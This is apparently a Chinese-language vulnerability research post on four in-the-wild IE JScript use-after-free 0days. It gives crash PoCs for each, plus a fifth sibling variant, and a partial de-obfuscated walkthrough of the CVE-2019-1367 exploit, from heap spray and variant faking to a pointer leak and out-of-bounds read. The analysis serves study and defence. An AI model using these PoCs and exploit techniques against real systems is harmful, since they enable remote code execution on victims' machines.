
# [原创]谈谈两年来的4个Jscript ITW 0day

[TOC]

## 异军突起的Jscript漏洞

### Jscript组件简介

`Jscript`组件是一个已被微软弃用的`JavaScript`引擎，主要在`IE8`以及更早的版本中使用。从`IE9`开始，微软用`Jscript9`替代了`Jscript`，但依然保持对`Jscript`的解析接口。一种比较常见的“召唤”方式如下：

```
<meta http-equiv="X-UA-Compatible" content="IE=8"></meta>
<script language="Jscript.Encode">
// ... Jscript Code ...
</script>
```

### WPAD攻击方式简介

2017年12月，Google Project Zero的Ivan Fratric等人公开了一种新的Windows平台攻击方式。该方式借助`Jscript`漏洞和`WPAD`/`PAC`协议，实现了在Win10上通过单个`Jscript`漏洞实现远程代码执行和沙箱逃逸。这种方式显然引起了攻击者的注意，2018年12月，谷歌捕获了第1个利用该方式进行实际攻击的漏洞，在随后的1年时间内，又连续出现3个相同类型的漏洞，一时间让原本已经无人问津的`Jscript`组件又重新引起大家的注意。

## Case by case介绍4个Jscript漏洞

在本小节中，笔者将结合每个漏洞的PoC简要介绍4个`Jscript`漏洞，通过PoC比对，读者将感受到这些漏洞的相似之处。

### CVE-2018-8653

首先跟随笔者看一下`CVE-2018-8653`的PoC，如下：

```
var objs = new Array();
var refs = new Array();
var dummyObj = new Object();
function uaf() {
// this未被GC追踪
for (var i = 0; i < 10000; i++) {
objs[i] = null;
}
CollectGarbage();
for (var i = 0; i < 201; i++) {
refs[i].prototype = null;
}
CollectGarbage();
alert(this); // <- 触发crash
return true;
}
for (var i = 0; i < 201; i++) {
var arr = new Array({ prototype: {} });
var e = new Enumerator(arr);
refs[i] = e.item();
}
for (var i = 0; i < 201; i++) {
refs[i].prototype = new RegExp();
refs[i].prototype.isPrototypeOf = uaf;
}
for ( var i = 0; i < 10000; i++ ) {
objs[i] = new Object();
}
dummyObj instanceof refs[200];
```

这个漏洞一个由`instanceof`回调导致的UAF漏洞，`Jscript`代码没有将自定义的`instanceof`回调函数即PoC中的`uaf`的`this`参数加入GC追踪列表，导致在回调函数中可以强制触发垃圾回收机制，得到悬垂指针，后面再次访问该指针时即发生UAF。

### CVE-2019-1367

接着是`CVE-2019-1367`的PoC，如下：

```
var spray = new Array();
function uaf() {
// arguments未被GC追踪
for(var i = 0; i < 20000; i++) {
spray[i] = new Object();
}
arguments[0] = spray[5000];
for(var i = 0; i < 20000; i++) {
spray[i] = 0;
}
CollectGarbage();
alert(arguments[0]); // <- 触发crash
return 0;
}
[0, 0].sort(uaf);
```

这个漏洞是一个由`Array.sort`函数导致的UAF漏洞，`Jscript`代码没有将`sort`函数中的`arguments`属性加入GC追踪列表，导致在回调函数中可以强制触发垃圾回收机制，得到悬垂指针，后面再次访问该指针时即发生UAF。

### CVE-2019-1429

第3个漏洞是`CVE-2019-1429`，这个漏洞对应的PoC如下：

```
var spray = new Array();
function uaf() {
// arguments未被GC追踪
for (var i = 0; i < 20000; i++) {
spray[i] = new Object();
}
arguments[0] = spray[5000];
for (var i = 0; i < 20000; i++) {
spray[i] = 1;
}
CollectGarbage();
alert(arguments[0]); // <- 触发crash
}
var o = {toJSON:uaf}
JSON.stringify(o);
```

这个漏洞是一个由`toJSON`函数导致的UAF漏洞，`Jscript`代码没有将`toJSON`函数中的`arguments`属性加入GC追踪列表，导致在回调函数中可以强制触发垃圾回收机制，得到悬垂指针，后面再次访问该指针时即发生UAF。

细心的读者肯定已经发现了，这和`CVE-2019-1367`不就是同一个漏洞吗？是的，它们就是同一个漏洞，但是微软就是没有补好。

### CVE-2020-0674

最后一个漏洞是`CVE-2020-0674`，我们来看一下这个漏洞的PoC：

```
var depth = 0;
var spray_size = 10000;
var spray = new Array();
var sort = new Array();
var total = new Array();
for(i = 0; i < 110; i++) sort[i] = [0, 0];
for(i = 0; i < spray_size; i++) spray[i] = new Object();
function uaf(arg1, arg2) {
// arg1, arg2等传入的参数未被GC追踪
arg1 = spray[depth * 2];
arg2 = spray[depth * 2 + 1];
if(depth > 50) {
spray = new Array();
CollectGarbage();
total.push(arg1);
total.push(arg2);
return 0;
}
depth += 1;
sort[depth].sort(uaf);
return 0;
}
sort[depth].sort(uaf);
for(i = 0; i < total.length; i++) {
typeof total[i]; // <- 触发crash
}
```

这个漏洞和`CVE-2019-1367`又非常像，又一个由`Array.sort`函数导致的UAF漏洞，所不同的是这次的问题不是出在`arguments`属性，而是出在传入的参数中。`Jscript`代码没有将`sort`函数中的调用参数加入GC追踪列表，导致在回调函数中可以强制触发垃圾回收机制，得到悬垂指针，后面再次访问该指针时即发生UAF。

### 一个“新漏洞“

相信许多读者和笔者一样，看上面几个案例后，会下意识地找一下通过Json序列化操作触发`CVE-2020-0674`的路径，并构造出第5个PoC：

```
var depth = 0;
var spray_size = 10000;
var spray = new Array();
var arr = new Array();
var total = new Array();
for(i = 0; i < 110; i++) arr[i] = [0, 0];
for(i = 0; i < spray_size; i++) spray[i] = new Object();
function uaf(arg1, arg2) {
// arg1, arg2等传入的参数未被GC追踪
arg1 = spray[depth * 2];
arg2 = spray[depth * 2 + 1];
if(depth > 50) {
spray = new Array();
CollectGarbage();
total.push(arg1);
total.push(arg2);
return 0;
}
depth += 1;
JSON.stringify(arr[depth], uaf);
return 0;
}
JSON.stringify(arr[depth], uaf);
for(i = 0; i < total.length; i++) {
typeof total[i]; // <- 触发crash
}
```

事实上，这个PoC确实可以导致Crash，是`CVE-2020-0674`的兄弟漏洞，但是在`CVE-2020-0674`的补丁出来后，此类UAF已经无法触发。

读者看完上述5个PoC后，是不是感觉微软在修补此类漏洞时显得很不专业？微软应该在一开始就将此类漏洞从根本上修复，这样就不会有这么多补丁绕过漏洞。事实上，Ivan Fratric在上述几个漏洞出现之前就发出过相关警告，并且在漏洞出现后也发表过感慨，喜欢考古的读者可以看一下文末参考链接“补丁分析”部分的两个推特链接。

## CVE-2019-1367利用代码分析

在本小节中，笔者将分享`CVE-2019-1367`利用代码的一些细节，之所以选择`CVE-2019-1367`，一方面是因为国外已经有研究员写过相关分析，但文章过长，且文内代码经过混淆，不易阅读，笔者结合手上资料对相关代码进行了解混淆，以便于阅读；另一方面是因为4个漏洞的利用代码大同小异，举一例即可。

以下只分析32位下的利用代码，为保持一致，代码中出现的注释复用国外分析文章中的注释。随笔者一起来看一下如何只用单个UAF漏洞即实现远程代码执行。

首先回顾下32位下`variant`在内存中的数据结构：

```
// total size 0x10 bytes
struct VAR {
QWORD type; // 8 bytes
void* obj_ptr; // 4 bytes
VAR next_var; // 4 bytes
}
```

### 从UAF到越界读取

利用代码首先在内存中布局一定数量的`RegExp`对象作为参数的`reSrc`大有玄机，后面会再次提及：

```
var refsLimit = 2 * 100 - 1;
for(var i = 0; i < refsLimit; i++)
rrefs[i] = new RegExp(reSrc); // <--- spray with pattern text "reSrc"
```

随后借助UAF漏洞，用经典的`Jscript` UAF占位手法详情可参考笔者对`CVE-2018-8353`的分析文章，将一个原本表示`RegExp`对象的`variant`的`type`域从`0x81`对象修改为`0x03` number，从而将一个`RegExp`对象指针以整数形式泄露出来：

```
function makeVariant(vt, dword1, dword2){
var charCodes = new Array();
charCodes.push(vt, 0x00, 0x00, 0x00, dword1 & 0xFFFF, (dword1 >> 16) & 0xFFFF, dword2 & 0xFFFF, (dword2 >> 16) & 0xFFFF);
return String.fromCharCode.apply(null , charCodes);
}
var reallocPropertyName = "\u0000\u0000";
while(reallocPropertyName.length < 0x17a)
reallocPropertyName += makeVariant(0x0082);
reallocPropertyName += "\u0003";
// ... code skipped ...
dummyArrs[0].sort(FreeingComparator);
var srcs = new Array();
for(var i = 0; i < refsLimit; i++)
try{
throw erefs[i];
}catch(e){
srcs[i] = e.source;
}
var leakIndex = -1;
for(var i = 0; i < refsLimit; i++)
try{
if((typeof nrefs[i]) === "number"){
leakIndex = i;
break;
}
}catch(e){}
if(leakIndex == -1)
throw new Error("Could not find RegExp address.");
else{}
```

得到`RegExp`对象指针后，借助`makeVariant`函数将`RegExpObj+4`的地方封装为一个字符串`variant` type=0x82 的指针部分，并再次借助漏洞将其布局到内存：

```
var leakRegExpObj = nrefs[leakIndex] & 0xFFFFFFFF;
var extendPropertyName = "\uFFFF\uFFFF\uFFFF\uFFFF\uFFFF\uFFFF" + makeVariant(0x0082, leakRegExpObj + 4); // string 4 bytes ahead, leakRegExpObj is previous fake VAR of type number (0x3)
for(var i = refsLimit; i >= leakIndex; i--)
nrefs[i] = null;
for(var i = 0; i < 0x1000; i++)
propHolders[i][extendPropertyName] = 1; // store the property name
while(--leakIndex >= 0)
try{
if((typeof nrefs[leakIndex]) === "string" && nrefs[leakIndex].length > 0x1000)
break;
else
nrefs[leakIndex] = null;
}
catch(e){}
if(leakIndex == -1)
throw new Error("Could not find RegExp leak string.");
else{}
```

搜索到对应的字符串`variant`后，此时的`variant.obj_ptr`指向一个伪造的`BSTR`对象的字符串部分，这个`BSTR`对象的`length`部分为`RegExpObj`的虚表，是一个非常大的值；`str`部分为`RegExpObj+0x04`。到这里已经具备了越界读取能力，随后借助这一越界读取能力读取整个`RegExpObj`的内容并保存到`fakeRegExpCharCodes`数组，并在数组的最后为`shellcode`预留了位置`0xCCCC`：
